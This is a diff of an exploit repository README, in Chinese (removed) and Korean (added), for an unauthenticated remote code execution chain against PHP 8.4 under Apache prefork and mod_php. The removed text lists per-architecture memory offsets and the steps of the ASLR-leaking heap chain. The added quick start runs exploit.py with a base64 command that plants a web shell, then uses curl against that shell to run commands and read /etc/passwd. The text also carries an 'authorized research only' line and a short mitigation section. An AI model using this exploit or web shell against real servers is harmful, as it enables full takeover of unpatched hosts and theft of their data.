@@ -1,151 +1,124 @@
-# php2shell - 官方环境 无需display_errors，不修改memory_limit
+# PHP2Shell — RCE 실증 데모
 
-中文 | [English](readme_en.md) | [日本語](readme_ja.md)
+> CVE-2026-109618 / CVE-2026-109619 (CVSS 9.2)  
+> PHP 엔진 메모리 버그 → **인증 없이 원격 코드 실행**
 
-**官方 prefork 配置（MaxRequestWorkers=150）下**，在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
-PHP 的约束下，一条命令拿到 RCE：
+[![데모 영상 — 클릭하면 고해상도 재생](demo.gif)](https://asciinema.org/a/8QjlI2ziHVQmVcPE)
 
-- stock 官方镜像 + 官方 ini + 官方 worker：**10/10**
-- 单 worker 基线（早期标定/调试）：**20/20**
-- 单次约 3–4 秒（含 149 个占位连接），被固定的 worker 不重启，目标 ini 未改
+한국어 | [中文](README.zh.md) | [English](readme_en.md) | [日本語](readme_ja.md)
 
-# 通用利用
+---
 
-理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。
+PHP의 메모리 처리 버그 2개를 연쇄(Chain D)해서, **URL 하나만 알면 서버에서 아무 명령이나 실행**할 수 있는 취약점입니다.
 
-关于 worker：官方 prefork 的 `MaxRequestWorkers=150` 也已打通。脚本先占住 149 个 worker 的未完成请求，再把 A1/B1/A2/B2 固定到剩下的同一个 child；单 worker 只是早期的调试形态（`--workers 1` 仍可复现）。
+- 앱 코드 실행 전에 PHP 엔진 안에서 발생 — 로그인·입력 검증 무관
+- `memory_limit=128M`, `post_max_size=8M` — **PHP 기본값이 곧 공격 조건**
+- 성공하면 `www-data` 권한 셸 획득
 
-## 快速开始（官方 php.ini-production / display_errors=Off / 128M）
+> [!NOTE]
+> ### 공격에 관여하는 계층
+>
+> **Linux 커널 — ASLR**(Address Space Layout Randomization)
+>
+> 프로세스가 시작될 때마다 라이브러리·힙·스택의 메모리 주소를 무작위 배치하는 OS 수준 방어입니다(`kernel.randomize_va_space=2`, 기본값 ON). `system()` 같은 함수의 주소가 매번 바뀌므로 공격자가 예측할 수 없습니다. **이 익스플로잇은 ASLR이 켜진 상태에서 작동합니다** — B1 단계에서 OOM 후 남은 stale pointer가 Set-Cookie 응답에 실려 나오면서, 공격자가 실제 메모리 주소를 알게 됩니다. 주소가 랜덤이어도 답이 유출되면 방어가 소용없습니다.
+>
+> **Apache — prefork MPM + mod_php**
+>
+> prefork MPM은 요청마다 독립 프로세스를 할당하는 Apache의 다중 처리 모듈입니다. 프로세스가 분리되어 있어 A1에서 만든 stale pointer는 그 프로세스에만 존재합니다. 공격자는 나머지 워커를 점유해 4단계를 같은 프로세스로 몰아넣습니다. mod_php는 PHP가 Apache 프로세스 안에서 모듈로 실행되는 구조입니다. CGI나 FPM처럼 별도 프로세스가 아니라 Apache와 메모리 공간을 공유하므로, PHP 엔진의 heap 주소가 Apache 응답(Set-Cookie)을 통해 유출될 수 있습니다.
+>
+> **PHP — 설정값**
+>
+> `post_max_size=8M` — POST 본문 크기 제한. 그러나 `Transfer-Encoding: chunked`로 보내면 `content_length=0`이 되어 이 검사를 건너뜁니다. 8M 제한인데 수십 MB를 밀어넣을 수 있습니다.
+> `memory_limit=128M` — 스크립트 메모리 한도. 공격자는 중첩 POST 필드로 ~22배 메모리 증폭을 일으켜 128M 안에서 OOM을 유발합니다.
+> `session.upload_progress` — 업로드 진행률 추적 기능(기본 ON). 이것이 OOM 후 stale session pointer를 남기는 원인입니다. **Off로 끄면 Chain D가 차단됩니다.**
+
+## 공격 흐름 (~3초)
+
+4개의 HTTP POST 요청이 **같은 프로세스**에 순서대로 도달해야 합니다. Apache prefork는 요청마다 별도 프로세스를 배정하므로, 나머지 워커를 점유해 단일 프로세스로 고정합니다.
+
+```mermaid
+%%{init: {'theme':'base', 'themeVariables': {'primaryColor':'#1a1a2e','primaryTextColor':'#fff','primaryBorderColor':'#e94560','lineColor':'#e94560','secondaryColor':'#16213e','tertiaryColor':'#0f3460','noteBkgColor':'#1a1a2e','noteTextColor':'#eee','noteBorderColor':'#e94560','actorBkg':'#e94560','actorTextColor':'#fff','actorBorder':'#e94560','activationBkgColor':'#e94560','activationBorderColor':'#c81e45','signalColor':'#eee','signalTextColor':'#1a1a2e','labelBoxBkgColor':'#16213e','labelBoxBorderColor':'#e94560','labelTextColor':'#eee','loopTextColor':'#eee','sequenceNumberColor':'#fff'}, 'sequence':{'mirrorActors':false,'messageAlign':'center','noteAlign':'center','actorMargin':140,'messageFontSize':15,'noteFontSize':14,'actorFontSize':16,'width':300}} }%%
+sequenceDiagram
+    actor A as 공격자
+    participant W as Apache 프로세스 (mod_php)
+
+    rect rgba(233, 69, 96, 0.08)
+    Note over A,W: Phase 1 — 주소 획득
+    A->>W: A1 — POST 폭탄 (파일 업로드 860개 → session.upload_progress 활성화)
+    activate W
+    Note right of W: OOM → 세션 정리 중 stale pointer 잔류
+    W-->>A: 500 에러 (쓸모없음)
+    deactivate W
+    A->>W: B1 — 세션 요청
+    activate W
+    Note right of W: 세션 핸들러가 stale pointer를 읽음
+    W-->>A: Set-Cookie: PHPSESSID=%60%ab%63%e3%d2%75...
+    deactivate W
+    Note left of A: 디코딩 → 0x75d2e363ab60<br/>libphp 베이스 → system() 주소 확정
+    end
+
+    rect rgba(233, 69, 96, 0.18)
+    Note over A,W: Phase 2 — 코드 실행
+    A->>W: A2 — POST 폭탄 (단순 OOM)
+    activate W
+    Note right of W: OOM → dangling pointer 생김
+    W-->>A: 500 에러 (쓸모없음)
+    deactivate W
+    A->>W: B2 — fake HashTable (shell.php 생성 명령 포함)
+    activate W
+    Note right of W: PHP가 fake HashTable을 정리하면서<br/>pDestructor → system() 호출<br/>→ shell.php 생성
+    W-->>A: localhost/shell.php 생성 성공
+    deactivate W
+    end
+```
+
+## 빠른 시작
 
 ```bash
-git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
+git clone https://github.com/XIYO/php2shell-bypass-aslr-exp.git
 cd php2shell-bypass-aslr-exp
 
-# 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
-./pure/run_pure.sh
-# target: OK
-# architecture: x86_64 (run exploit with --arch x86_64)
-# PHP 8.4.26 ...
-# display_errors => Off => Off
-# memory_limit => 128M => 128M
-# workers: official (run exploit with --workers 150)
+# 1. 타겟 서버 시작
+docker compose up -d
 
-# 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
-python3 exploit.py --port 18110
-#       --arch auto（默认）：自动识别 x86_64 / aarch64
-#       pinned 150/150 workers (149 holders)
-# [try 1] A1: END-cleanup send_cookie OOM
-# [try 1] B1: stale-id OOB read (chunk base + libphp)
-#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
-#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
-#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
-# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
-# [4/4] RCE OK; proof .../out/p1:
-# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# 2. 웹셸 설치 (exploit.py가 서버에 shell.php를 생성)
+python3 exploit.py --port 18120 --workers 150 \
+  --cmd 'echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+|base64 -d>/var/www/html/shell.php'
+
+# 3. 직접 명령 실행 — URL 하나로 서버를 조작
+curl 'http://localhost:18120/shell.php?c=whoami'
+# www-data
+
+curl 'http://localhost:18120/shell.php?c=ls -la /'
+# drwxr-xr-x  1 root root 4096 Oct 27 06:35 .
+# -rwxr-xr-x  1 root root    0 Oct 27 06:35 .dockerenv
+# ...
+
+curl 'http://localhost:18120/shell.php?c=cat /etc/passwd'
+# root:x:0:0:root:/root:/bin/bash
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# ...
+
+# 4. 정리
+docker compose down
 ```
 
-不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
-`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
-官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际架构、ini 和
-MPM 值；`--single` 才挂非官方的单 worker 覆盖
-`pure/docker/apache-single-worker.conf`（配合 `--workers 1`）。`docker/apache.conf`
-只是给旧 harness 保留的兼容软链，指向同一个文件。
-Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
-`DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
-同一构建做离线标定。
+## 영향 범위
 
-常用参数：
+| 상태 | 버전 |
+|------|------|
+| **취약** | PHP 5.x ~ 8.4.26 (Chain D는 8.4 + mod_php prefork) |
+| **패치** | 8.4.27+ / 8.3.22+ / 8.2.28+ / 8.1.33+ / 7.4.33-31+ (Sury) |
 
-```bash
-# 换新 ASLR 复测（重启容器）
-python3 exploit.py --port 18110 --restart p2s-pure-18110
+## 방어
 
-# 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
-python3 exploit.py --port 18110 --workers 1
-
-# ARM64 也可显式指定（默认 --arch auto 自动识别）
-python3 exploit.py --arch aarch64 --port 18110 --workers 1
-
-# 自定义命令：把脚本写进挂载目录，再用 sh 执行
-printf 'id; uname -a > /out/p1\n' > out/c
-python3 exploit.py --port 18110 --cmd 'sh</out/c'
+```ini
+session.upload_progress.enabled = Off   ; 즉시
+; + PHP 패치 적용                        ; 근본
 ```
 
-`--retries` 默认 3；如果某次越界窗口里最常见的指针不是
-`zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
-整条链重来。
+## 참고
 
-## 这条纯 HTTP 链
-
-目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
-和普通 GET/POST：
-
-0. **worker pinning**：官方 `MaxRequestWorkers=150`；先开 149 个只发了
-   一半 body 的 POST 占住其它 child，A1/B1/A2/B2 就都会落到剩下的同一个
-   child，跨请求的悬空指针才有效。
-1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
-   `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
-   可以发送远大于 8M 的 body 做堆整形。
-2. **A1**：860 个 depth-64 嵌套文件字段 + filler + 大值 + 4000B
-   `PHP_SESSION_UPLOAD_PROGRESS`，在 END cleanup 的 `php_url_encode`
-   里 OOM；bailout 留下悬空的 `PS(id)` / `PS(mod_data)`，`send_cookie=1`。
-3. **B1（越界读）**：安全 close 后让 `PS(id)` 指向伪造的
-   `zend_string` 头（len=0xC8000，data 含 `/`），`Set-Cookie` 把 id
-   chunk 之后 800KB 内存编码出来。窗口里同时有：
-   - 2MiB 对齐的 chunk 指针簇 → id chunk / main chunk base；
-   - `G:400` 在 id chunk 尾部留下的洞被 900 个嵌套数组字段填满，
-     真实 HashTable 的 `pDestructor = zval_ptr_dtor` 出现 1095 次
-     → `libphp = 值 - 0x65EB60`。
-4. **A2 + B2**：cheap-OOM 把 `PS(hash_serialize_verifier)` 指到堆上
-   (`main+0x7D720`)；B2 用 384B 引用值把它覆盖成指向
-   `S=main+0xF8398` 的 zval，S 处伪造 zend_array 的
-   `pDestructor = zif_system` (`libphp+0x465370`)，shutdown 时
-   `zend_hash_destroy` 调用 `system("id>/out/p1")`。
-
-偏移（本构建，ASLR 无关）：
-
-| 符号/位置 | x86_64 | aarch64 |
-|---|---|---|
-| 泄漏的 `zval_ptr_dtor` 指针 | `libphp+0x65EB60` | `libphp+0x63812B` |
-| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
-| fake array `S` | `main+0xF8398` | `main+0xF8398` |
-| A2 的 `hsv` | `main+0x7D720` | `main+0x7D720` |
-
-aarch64 的 `zval_ptr_dtor` ELF 符号位于 `0x638120`，但此泄漏中重复出现的
-指针在其后 11 字节，因此 profile 减去 `0x63812B`。
-目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
-mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
-ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
-
-## 证据
-
-- 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
-- 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
-- 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
-- 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
-- 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
-- 原生 ARM64 官方镜像日志（10/10 个全新容器）：[pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
-- 原生 ARM64 官方 worker 日志（3/3 个全新容器）：[pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
-- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
-
-## 旧线（legacy，非本目标）
-
-早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
-（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
-与本 README 的官方配置目标无关，已归档到
-[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
-同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
-[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线；
-旧的 `docker/php.ini`、`docker/docker-compose.yml`、`docker/offsets.py` 和
-`lab/apache2_aslr.conf` 也归档到了 `archive/legacy-8m/docker|lab/`。
-真正的单 worker 配置和目标页面在 `pure/docker/`
-（`apache-single-worker.conf`、`www/index.php`）；`docker/` 只保留
-`apache.conf`、`www` 两个兼容软链指向那里。
-
-## 复现声明
-
-- 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
-  `memory_limit=128M`）和官方 prefork worker（MaxRequestWorkers=150）：
-  没有自定义 ini、没有 `display_errors=On` 依赖、没有目标侧文件、
-  没有 `session_start()`、交付路径不用 gdb。
-- 仅用于授权环境中的漏洞研究与复现。
+- [원본 (9bie)](https://github.com/9bie/php2shell-bypass-aslr-exp)
+- [CVE-2026-109618](https://nvd.nist.gov/vuln/detail/CVE-2026-109618)
+- [CVE-2026-109619](https://nvd.nist.gov/vuln/detail/CVE-2026-109619)
